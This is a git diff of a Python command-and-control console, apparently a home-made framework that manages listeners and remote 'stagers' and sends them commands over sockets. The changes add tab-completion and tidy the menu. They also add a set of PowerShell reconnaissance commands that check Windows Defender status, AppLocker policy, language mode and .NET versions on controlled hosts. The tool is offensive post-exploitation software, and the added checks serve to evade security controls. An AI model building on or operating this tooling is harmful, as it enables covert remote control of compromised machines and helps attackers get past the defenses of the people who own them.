@@ -4,19 +4,37 @@ import threading
 import queue
 import uuid 
 
+
+import readline
+readline.parse_and_bind("tab: complete")
+
+class VolcabCompleter:
+    def __init__(self,volcab):
+        self.volcab = volcab
+
+    def complete(self,text,state):
+        results =  [x for x in self.volcab if x.startswith(text)] + [None]
+        return results[state]
+
+def setautocomplete(words):
+    completer = VolcabCompleter(words)
+    readline.set_completer(completer.complete)
+
+
 class myconstant():
     def __init__(self):
 
         self.TAG_MYCS = "[MYCS]"
         self.TAG_LISTENER = "[Listener]"
-        self.TAG_STAGER = "[Stager]"
+        #self.TAG_STAGER = "[Stager]"
         self.TAG_INTE_STAGER = "[Interact]"
 
         self.CMD_USELISTENER = "uselistener"
-        self.CMD_USESTAGER = "userstager"
+        #self.CMD_USESTAGER = "userstager"
         self.CMD_INTERACTSTAGER = "stager"
         self.CMD_HELP = "help"
         self.CMD_EXIT = "exit"
+        self.CMD_AUTOLIST = [self.CMD_USELISTENER,self.CMD_INTERACTSTAGER,self.CMD_HELP,self.CMD_EXIT]
 
         self.CMD_BACK = "back"
         self.CMD_LISTENER_GETINFO = "info"
@@ -25,17 +43,32 @@ class myconstant():
         self.CMD_LISTENER_START = "start"
         self.CMD_LISTENER_LIST = "list"
         self.CMD_LISTENER_STOP = "stop"
+        self.CMD_LISTENER_AUTOLIST = [self.CMD_BACK,self.CMD_LISTENER_GETINFO,self.CMD_LISTENER_SETHOSTNAME,
+                                        self.CMD_LISTENER_SETPORT,self.CMD_LISTENER_START,self.CMD_LISTENER_LIST,self.CMD_LISTENER_STOP,self.CMD_HELP]
 
         self.CMD_STAGER_GET_LIST = "list"
-        self.CMD_STAGER_GET_RUNNING_LIST = "rlist"
+        #self.CMD_STAGER_GET_RUNNING_LIST = "rlist"
         self.CMD_STAGER_GET_INTO = "into"
         self.CMD_STAGER_GET_HISTORY = "history"
-        self.CMD_STAGER_GET_UNSEEN_HISTORY = "uhistory"
+        #self.CMD_STAGER_GET_UNSEEN_HISTORY = "uhistory"
+        self.CMD_STAGER_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_GET_LIST,self.CMD_STAGER_GET_INTO,self.CMD_STAGER_GET_HISTORY,self.CMD_HELP]
+
 
 
 class myconstant_networking():
     def __init__(self):
         self.PSRUN_SUCCESS = "PSRUN_SUCCESS"
+
+
+class mybuildin_cmd():
+    def __init__(self):
+        self.IF64BIT = "[Environment]::Is64BitProcess"
+        self.GETNETVERSION = "get-childitem -path \"HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\""
+        self.GETDEFENDER = "Get-MpComputerStatus"
+        self.GETAPPLOCKER = "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections"
+        self.GETLANGMODE = "$ExecutionContext.SessionState.LanguageMode"
+
+
 
 
 # socket is assume connected
@@ -62,7 +95,7 @@ class mysocket_handler():
                 t_endmsg = self.__msg_buf.find(self.__msg_tag_ed)
                 # msg is from startmsg + len(tag) to endmsg
                 r_msg = self.__msg_buf[(t_startmsg + len(self.__msg_tag_st)):t_endmsg]
-                print("[DEBUG] r_msg: {}".format(r_msg))
+                #print("[DEBUG] r_msg: {}".format(r_msg))
                 # remove sub string from buf + return
                 self.__msg_buf = self.__msg_buf[(t_endmsg + len(self.__msg_tag_ed)):]
                 return r_msg
@@ -116,15 +149,16 @@ class myserver():
             
             try:
                 myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+                myhistory.append("[Stager] Command_tag: {}  Command: {}".format(cmd_struct_to_send[0],cmd_struct_to_send[1]))
                 encode_tag = cmd_struct_to_send[0].encode("ascii", "ignore")
                 send_result = mysocket.send(encode_tag)
-                myhistory.append("[Stager] Total of number to send: {}, Sent: {}".format(len(encode_tag), send_result))
+                myhistory.append("[Stager] Total of number of bytes to send: {}, Sent: {}".format(len(encode_tag), send_result))
                 recv_result = t_mysockethandler.get_nextmsg()
                 myhistory.append("[Stager] Send command_tag result: {}".format(recv_result))
 
                 encode_cmd = cmd_struct_to_send[1].encode("ascii", "ignore")
                 send_result = mysocket.send(encode_cmd)
-                myhistory.append("[Stager] Total of number to send: {}, Sent: {}".format(len(encode_cmd), send_result))
+                myhistory.append("[Stager] Total of number of bytes to send: {}, Sent: {}".format(len(encode_cmd), send_result))
                 recv_result = t_mysockethandler.get_nextmsg()
                 myhistory.append("[Stager] Send command result: {}".format(recv_result))
 
@@ -134,7 +168,7 @@ class myserver():
                 # ack for success
                 encode_cmd = t_net_constant.PSRUN_SUCCESS.encode("ascii", "ignore")
                 send_result = mysocket.send(encode_cmd)
-                myhistory.append("[DEBUG] PSRUN_SUCCESS sent")
+                #myhistory.append("[DEBUG] PSRUN_SUCCESS sent")
                 myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
 
             except Exception as e:
@@ -266,7 +300,7 @@ class mymainclass():
 
     def __cmd_list_stager(self):
         print("\n+++++++++++++++++++++++++++++++++++")
-        print(self.__t_myconstant.CMD_STAGER_GET_RUNNING_LIST + ": Get a list of running stager")
+        #print(self.__t_myconstant.CMD_STAGER_GET_RUNNING_LIST + ": Get a list of running stager")
         print(self.__t_myconstant.CMD_STAGER_GET_LIST + ": Get full list of stager")
         print(self.__t_myconstant.CMD_STAGER_GET_HISTORY + ": Get history of stager message")
         print(self.__t_myconstant.CMD_STAGER_GET_INTO + ": Send cmd to stager")
@@ -285,6 +319,15 @@ class mymainclass():
 
         to_exit = False
         while (not to_exit):
+
+            if cmd_tag == self.__t_myconstant.TAG_MYCS:
+                setautocomplete(self.__t_myconstant.CMD_AUTOLIST)
+            if cmd_tag == self.__t_myconstant.TAG_LISTENER:
+                setautocomplete(self.__t_myconstant.CMD_LISTENER_AUTOLIST)
+            if cmd_tag == self.__t_myconstant.TAG_INTE_STAGER:
+                setautocomplete(self.__t_myconstant.CMD_STAGER_AUTOLIST)
+            
+
             user_input = input(cmd_tag + "> ")
             command_id = user_input
             
@@ -295,9 +338,9 @@ class mymainclass():
                     cmd_tag = self.__t_myconstant.TAG_LISTENER
                     continue
 
-                if command_id == self.__t_myconstant.CMD_USESTAGER:
-                    cmd_tag = self.__t_myconstant.TAG_STAGER
-                    continue
+                # if command_id == self.__t_myconstant.CMD_USESTAGER:
+                #     cmd_tag = self.__t_myconstant.TAG_STAGER
+                #     continue
                 
                 if command_id == self.__t_myconstant.CMD_INTERACTSTAGER:
                     cmd_tag = self.__t_myconstant.TAG_INTE_STAGER
@@ -346,6 +389,9 @@ class mymainclass():
                     continue
                 
                 if command_id == self.__t_myconstant.CMD_LISTENER_STOP:
+                    #set auto compete to listener uuid
+                    setautocomplete(self.__t_myserver.get_listener())
+
                     user_input_listener = input("Please enter the listener uuid: ")
                     if user_input_listener not in self.__t_myserver.get_listener():
                         print("Please input a valid listener uuid")
@@ -369,11 +415,14 @@ class mymainclass():
                     self.__t_myserver.print_stager()
                     continue
                 
-                if command_id == self.__t_myconstant.CMD_STAGER_GET_RUNNING_LIST:
-                    self.__t_myserver.print_stager_running()
-                    continue
+                # if command_id == self.__t_myconstant.CMD_STAGER_GET_RUNNING_LIST:
+                #     self.__t_myserver.print_stager_running()
+                #     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_GET_HISTORY:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_stager())
+
                     user_input_stager = input("Please enter the stager uuid: ")
                     if user_input_stager not in self.__t_myserver.get_stager():
                         print("Please input a valid stager uuid")
@@ -383,6 +432,9 @@ class mymainclass():
                     continue
 
                 if command_id == self.__t_myconstant.CMD_STAGER_GET_INTO:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_stager())
+
                     user_input_stager = input("Please enter the stager uuid: ")
                     if user_input_stager not in self.__t_myserver.get_stager():
                         print("Please input a valid stager uuid")
@@ -395,6 +447,7 @@ class mymainclass():
 
 
 if __name__ == "__main__":
+
     t_mymainclass = mymainclass()
     t_mymainclass.main()
 
